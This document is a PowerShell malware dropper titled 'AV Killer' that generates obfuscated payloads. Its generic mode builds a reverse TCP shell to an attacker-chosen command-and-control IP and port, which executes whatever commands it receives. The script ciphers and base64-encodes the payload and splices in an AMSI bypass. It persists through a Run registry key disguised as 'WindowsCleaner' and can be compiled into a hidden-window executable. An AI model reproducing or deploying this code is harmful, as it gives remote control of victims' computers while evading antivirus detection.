clear-host
write-host "
 █████╗ ██╗   ██╗    ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
██╔══██╗██║   ██║    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
███████║██║   ██║    █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
██╔══██║╚██╗ ██╔╝    ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
██║  ██║ ╚████╔╝     ██║  ██╗██║███████╗███████╗███████╗██║  ██║
╚═╝  ╚═╝  ╚═══╝      ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
Coded by kabuto"
function cipher ($string, $key) {
    $string = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
    $string = [Text.Encoding]::ASCII.GetBytes($string) 
    Remove-variable -name payload -ErrorAction SilentlyContinue 
    for (([String[]]$payload = $string), ($i = 0); $i -lt $string.Length; $i++) {
        $payload[$i] = [int]$string[$i] + $key
        $payload[$i] = [char][int]$payload[$i]  
    }
    for (($output = ""), ($i = 0); $i -lt $string.length; $i++) {
        $output = $output + $payload[$i] 
    }
    write-output $output
}

$string = read-host -prompt "
Custom payload or generic payload?

options:   
(c) custom
(g) generic

Choose an option"
if ($string -eq "c") {
    do {
        $resourcefolder = read-host -prompt "Where do you want your payload written to?"
        $exists = test-path $resourcefolder
    } while ($exists -eq $false)
    $filename = read-host "What do you want to name the file?"
    $filename = $filename + ".ps1" 
    $string = read-host -prompt "payload"
    $key = 0..50000 | get-random
    $cipherpayload = cipher -string $string -key $key 
    $base64payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cipherpayload))
    $base64payload = "Powershell /w 1 /e " + $base64payload
    New-Item -path $resourcefolder -type file -name $filename 
    Set-Location $resourcefolder
    Set-Content $filename $base64payload
    Set-Clipboard $base64payload
    $executable = read-host "Create executable?(This will work in case the .ps1 is faulty, PS2EXE module needs to be installed for this)(Y/N)"
    if ($executable -eq "Y") {
        Invoke-PS2EXE -inputFile .\$filename -outputFile $filenameexe -noConsole -noOutput -noConfigFile -noError -noVisualStyles 
    }
    write-host "`n`n`nCustom payload written at "$resourcefolder"\"$filename" but !!!BE WARNED!!! the payload has also been copied to your clipboard, this payload is more reliable
to create a working payload (the .ps1 one may not work), open powershell ISE, paste, and save, that one should work." 
} 

if ($string -eq "g") {
    $IP = read-host "C&C IP"
    $PORT = read-host "C&C Port"
    $AMSI = read-host "Input your amsi bypass"
    do {
        $resourcefolder = read-host -prompt "Where do you want your payload written to?"
        $exists = test-path $resourcefolder
    } while ($exists -eq $false)
    
    $filename = read-host "Name of your file (no extension, .ps1 is auto selected)"
    $filenameexe = $filename + ".exe"
    $filename = $filename + ".ps1"

    $payload1 = 'function remove-backdoor {set-location HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
        remove-itemproperty -name WindowsCleaner -path .\;set-location C:}do {
        start-sleep 2	
        $addr = "'+ $IP + '"
        $port = '+ $PORT + '
        $client = $stream = $buffer = $writer = $data = $result = $null;
        try {$client = New-Object Net.Sockets.TcpClient($addr, $port);
        $stream = $client.GetStream();$buffer = New-Object Byte[] 1024;
        $encoding = New-Object Text.AsciiEncoding;$writer = New-Object IO.StreamWriter($stream);
        $writer.AutoFlush = $true;Write-Host "Attempting to reach host";
        Write-Host "";$bytes = 0;
        do {$writer.Write("PWNED! "+$env:username+"@"+$env:computername+"`nPS " + (Get-Location).Path + "> ");
        do {$bytes = $stream.Read($buffer, 0, $buffer.Length);
        if ($bytes -gt 0) {
        $data = $data + $encoding.GetString($buffer, 0, $bytes);
        }} while ($stream.DataAvailable);
        if ($bytes -gt 0) {$data = $data.Trim();if ($data.Length -gt 0) {
        try {$result = Invoke-Expression -Command $data 2>&1 | Out-String;
        } catch {$result = $_.Exception | Out-String;
        }Clear-Variable -Name "data";$length = $result.Length;$count = 0;
        $bytes = $buffer.Length;while ($length -gt 0) {
        if ($length -lt $buffer.Length) {$bytes = $length;
        }$writer.Write($result.substring($count, $bytes));$count += $bytes;
        $length -= $bytes;}Clear-Variable -Name "result";
        }}} while ($bytes -gt 0);Write-Host "No Host connected, trying again in 2 seconds";
        } catch {Write-Host $_.Exception.InnerException.Message;
        } finally {if ($null -ne $writer) {$writer.Close(); $writer.Dispose();
        Clear-Variable -Name "writer";}if ($null -ne $stream) {$stream.Close(); $stream.Dispose();
        Clear-Variable -Name "stream";}if ($null -ne $client) {$client.Close(); $client.Dispose();
        Clear-Variable -Name "client";}if ($null -ne $buffer) {$buffer.Clear();
        Clear-Variable -Name "buffer";}if ($null -ne $result) {
        Clear-Variable -Name "result";}if ($null -ne $data) {
        Clear-Variable -Name "data";}
        [System.GC]::Collect();}
        } while ($true)'

    $key = 0..50000 | get-random
    $cipherpayload = cipher -string $payload1 -key $key 
    $cipherpayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cipherpayload))
    $payload2 = '[String]$pYuoadLs = "' + $cipherpayload + '"' + "`n" + '$sjIshaBw = ' + $key + "`n" + '$pYuoadLs = [System.Text.Encoding]::unicode.getstring([System.Convert]::FromBase64String($pYuoadLs))' + "`n" + '$AaiSdJASd = $pyUoaDls.tOcHARARrAy()
    For(($I = 0); $I -lT $pYuoaDLS.LEngth; $i++) {
    $aaIsdjasD[$I] = [InT]$AAIsdJASd[$I] - $sjISHaBW
    }FoR (($HTsugebT = ""), ($i = 0); $i -lt $pyUoadls.leNGTH; $i++) {
    $hTsUgebT = $HtsuGebt + $AAISdjaSD[$i]}' + "`n" + $AMSI + "`n" + 'IeX $hTsuGEbt' + "`n" + 'while($true){start-sleep 1}'
    $base64payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload2))
    $finalpayload = 'function backdoor {' + "`n" + '$payload = "' + $base64payload + '"' + "`n" + '$payload = "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe /w 1 /e " + $payload
	set-location HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	New-ItemProperty -path .\ -name WindowsCleaner -value $payload
    set-location C:   
}
set-location C:\' + "`n" + $payload2 

    New-Item -path $resourcefolder -type file -name $filename 
    Set-Location $resourcefolder 
    Set-content $filename $finalpayload
    Set-Clipboard $finalpayload
    $executable = read-host "Create executable?(This will work in case the .ps1 is faulty, PS2EXE module needs to be installed for this)(Y/N)"
    if ($executable -eq "Y") {
        Invoke-PS2EXE -inputFile .\$filename -outputFile $filenameexe -noConsole -noOutput -noConfigFile -noError -noVisualStyles 
    }
    write-host "`n`n`nGeneric reverse TCP shell written at "$resourcefolder"\"$filename" but !!!BE WARNED!!! the payload has also been copied to your clipboard, this payload is more reliable
to create a working payload (the .ps1 one may not work), open powershell ISE, paste, and save, that one should work." 
}

else {
    write-host "Incorrect input, please inpute either `"g`" or `"c`" "
}
###################
###################
##               ##
##               ##
## AV Killer(tm) ##
##  Mal Dropper  ##
##               ##
##               ##
##   Signature   ##
##       &       ##
##   Heuristic   ##
##    Evasion    ##
##               ##
###################
###################
